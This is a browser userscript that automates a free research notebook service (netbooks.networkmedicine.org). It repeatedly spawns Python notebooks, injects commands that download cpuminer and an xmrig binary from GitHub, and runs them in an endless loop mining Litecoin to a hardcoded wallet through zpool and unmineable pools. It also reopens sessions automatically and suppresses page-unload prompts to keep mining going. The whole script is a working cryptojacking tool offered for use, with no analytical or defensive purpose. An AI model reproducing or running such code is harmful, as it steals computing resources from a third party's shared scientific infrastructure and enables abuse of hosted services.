// ==UserScript==
// @name         MOEDA LITECOIN  ZPOOL
// @namespace    felipe-netbook
// @version      0.1
// @description  try to take over the world!
// @author       felipe
// @icon
// @grant        none
// @match        https://www.invertexto.com/netbook
// @match        http://netbooks.networkmedicine.org/*/Welcome_to_netBooks.ipynb*
// @match        http://netbooks.networkmedicine.org/*/Untitled*
// @match        http://netbooks.networkmedicine.org/user/*/
// @match        http://netbooks.networkmedicine.org/hub/spawn-pending/*
// ==/UserScript==

//************
let site_endereco='http://netbooks.networkmedicine.org';
let verif=0;
let endereco=window.location.href;
verif=endereco.match(/invertexto\.com\/netbook/gi);
if(verif!=null)
(function() {
    'use strict';
  window.open(site_endereco,"_blank");
})();
//************
verif=0;
endereco=window.location.href;
verif=endereco.match(/Welcome_to_netBooks/gi);
if(verif!=null)
(function() {
    'use strict';

let elem_menu_file=document.getElementById('filelink');
let elem_submenu_new=document.getElementById('new_notebook').getElementsByTagName("a")[0];
let elem_submenu_python=0;//document.getElementById('new-notebook-submenu-python3').getElementsByTagName("a")[0];

setTimeout(function(){elem_menu_file.click()},3000);
setTimeout(function(){elem_submenu_new.click();
elem_submenu_python=document.getElementById('new-notebook-submenu-python3').getElementsByTagName("a")[0];
elem_submenu_python.click()},2000);
setTimeout(()=>{
window.close();
},20000);
})();
//************
endereco=window.location.href;
verif=endereco.match(/spawn-pending/gi);
if(verif!=null)
(function() {
    'use strict';
setTimeout(()=>{
//let lnk=$('a #start .btn-primary')[0];
let prg1=$('#progress-details')[0];
let prg2=$('#progress-log')[0];
if(prg1==null && prg2==null){
window.open(site_endereco,"_blank");
setTimeout(()=>{window.close()},10000);
}
},5000);
})();
//************
endereco=window.location.href;
verif=endereco.match(/\/user\/*\//gi);
if(verif!=null)
(function() {
    'use strict'; 
let d=$('div .error')[0];
if(d!=null)setTimeout(()=>{
window.open(site_endereco,"_blank");
setTimeout(()=>{window.close()},10000);
},5000);
})();
//************
verif=0;
endereco=window.location.href;
verif=endereco.match(/Untitled/gi);
if(verif!=null)
(function() {
    'use strict';
let texto=0;
var linha=0;

texto='!sudo su\n\r';
texto+='import random\n\r';
texto+='!wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz\n\r';
texto+='!wget https://raw.githubusercontent.com/prestess/HTTP/main/config.json\n\r';
texto+='!wget https://raw.githubusercontent.com/prestess/HTTP/main/xmrig\n\r';
texto+='!tar xf cpuminer-opt-linux.tar.gz\n\r';
texto+='while 1:\n\r';
texto+=' ';
texto+='!./cpuminer-sse2  -t 10  -r 5  -a yescrypt -o stratum+tcp://yescrypt.na.mine.zpool.ca:6233 -p c=LTC -u LTC:MGc1CUwppmaF8R4hVVbgXhYBWeEus3jrZF  &\n\r';
texto+=' ';
texto+='!chmod +x ./xmrig && ./xmrig --donate-level 1 -o rx.unmineable.com:3333 -u LTC:MGc1CUwppmaF8R4hVVbgXhYBWeEus3jrZF -t999  &\n\r';
texto+=' ';
texto+='!chmod +x ./xmrig && ./xmrig\n\r';
texto+='!sleep random.randint(1,6)\n\r';

linha="<div class='container' id='notebook-container'>";


setInterval(function(){
window.onbeforeunload=function(){let id=null;}
let onBeforeUnloadListener;
window.addEventListener('beforeunload', onBeforeUnloadListener = ev => {
  ev.preventDefault();
  ev.returnValue = 'Any';
});
window.removeEventListener('beforeunload', onBeforeUnloadListener);
},30000);

let nova=false;
setInterval(function(){
//div.modal-footer
//button.btn.btn-default.btn-sa
let dbtn=$('div .modal-footer')[0].getElementsByTagName('button')[0];
if(dbtn && nova==false){
nova=true;
window.open(site_endereco,"_self");
}
},5000);

setTimeout(function(){
document.activeElement.value=texto;
//document.getElementsByTagName('textarea')[0].value=texto;
},10000);

setTimeout(function(){
document.getElementById('run_int').getElementsByTagName('button')[0].click();
},20000);

})();
//*********